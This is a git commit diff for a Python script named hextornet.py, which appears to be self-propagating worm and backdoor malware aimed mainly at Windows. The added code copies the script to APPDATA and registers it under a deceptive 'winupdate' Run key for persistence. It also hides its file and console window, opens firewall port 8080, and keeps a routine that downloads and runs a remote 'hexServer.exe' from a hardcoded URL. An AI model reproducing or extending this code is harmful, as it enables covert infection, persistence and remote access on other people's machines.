3df977cd76f11e1bfd1358ce22c631354b5a6e25
Hector Torres <hectormtc@live.com>
2018-10-14 20:17:21 -0600

    Update hextornet.py

--- hextornet.py
+++ hextornet.py
@@ -7,9 +7,20 @@ from urllib2 import urlopen
 import subprocess
 import shutil
 from time import sleep
+import win32con
+import win32api
+import win32console
+import win32gui
+import win32event
+import winerror
+from _winreg import *
+
+strPath = os.path.realpath(sys.argv[0])  # get file path
+TMP = os.environ["TEMP"]  # get temp path
+APPDATA = os.environ["APPDATA"]
 
 src1 = os.path.abspath(__file__)
-src = os.path.abspath('hextornet.py')
+src = os.path.abspath(__file__)
 usr = getpass.getuser()
 URL = 'http://download2269.mediafire.com/92omzolxl7gg/b9n0lw33obqkou2/hexServer.exe'
 
@@ -19,14 +30,14 @@ hexDir = zip(directories, hextornet)
 localization = []
 dst = ""
 
+mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    sys.exit(0)
+
 
 def windows_client(system = sys.platform):
         if system.startswith('win'):
-	    import win32con
-            import win32api
-            import win32console
-            import win32gui
-            #from _winreg import *
             return True
         else:
             return False
@@ -39,27 +50,25 @@ def linux_client(system = sys.platform):
         return False
 
 
-def hide():
+def console():
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window,0)
         return True
 
+def hide():
+    if src:
+        win32api.SetFileAttributes(src,win32con.FILE_ATTRIBUTE_HIDDEN)
 
 def addStartup():
-	try:
-		
-                fp = os.path.dirname(os.path.realpath(__file__))
-                file_name = sys.argv[0].split("\\")[-1]
-                new_file_path = fp + "\\" + file_name
-                keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-                key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-
-	except:
-		
-                SetValueEx(key2change, "WinProcess", 0, REG_SZ, new_file_path)
-                path = 'C:\\Users\\' +usr+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-                os.system('copy hextornet.py path')
-                #shutil.move(src, path)
+        try:
+                strAppPath = APPDATA + "\\" + os.path.basename(strPath)
+                copyfile(strPath, strAppPath)
+                objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+                SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
+        except WindowsError:
+                print"ERROR"
+        else:
+                print"SUCCESS"
 
 
 
@@ -67,9 +76,9 @@ def verification(source, worm, dst):
         code = dst + worm + '.py'
         if source != code or source == code:
                 source = os.path.abspath(dst + worm)
-                downloadBackDoor(URL, dst)
+                #downloadBackDoor(URL, dst)
         else:
-		print'[SOURCE != CODE]'
+                print'[SOURCE != CODE]'
                 pass
         
 def validate():
@@ -109,41 +118,42 @@ def downloadBackDoor(url, path):
         outfile.write(content)
         outfile.close()
         source= os.path.join(path)
-	print'[MOVE] ',source,'[TO] ',path
-        shutil.move(source, path)
+        print'[MOVE] ',source,'[TO] ',path
+        #shutil.move(source, path)
         print'\t[DOWNLOAD IN]',os.path.abspath(filename)
-	print'\t[DOWNLOAD DONE]', filename
-	print'\t[RUNNING]',os.path.abspath(filename)
+        print'\t[DOWNLOAD DONE]', filename
+        print'\t[RUNNING]',os.path.abspath(filename)
         run(os.path.abspath(filename))
 
 
 def runWorms():
         for worm in range(0, len(localization)):
-		run(localization[worm])
+                run(localization[worm])
 
 
 def run(program):
         print'[RUN]',program
         try:
-                process = subprocess.Popen("python "+str(program), shell=True)
-		process.wait()
+                process = subprocess.Popen(str(program), shell=True)
+                #process.wait()
         except Exception as e:
                 return '[NOT RUN!!]'+str(e)
 
 
 def openPort():
-        os.system('netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80')
+        os.system('netsh advfirewall firewall add rule name="Open Port 8080" dir=in action=allow protocol=TCP localport=8080')
 
 def main():
         if windows_client():
-		validate()
                 addStartup()
                 propagate()
-		openPort()
-		hide()
+                validate()
+                openPort()
+                hide()
+                console()
         elif linux_client():
-		propagate()
-		validate()
+                propagate()
+                validate()
 
 
 if __name__ == "__main__":
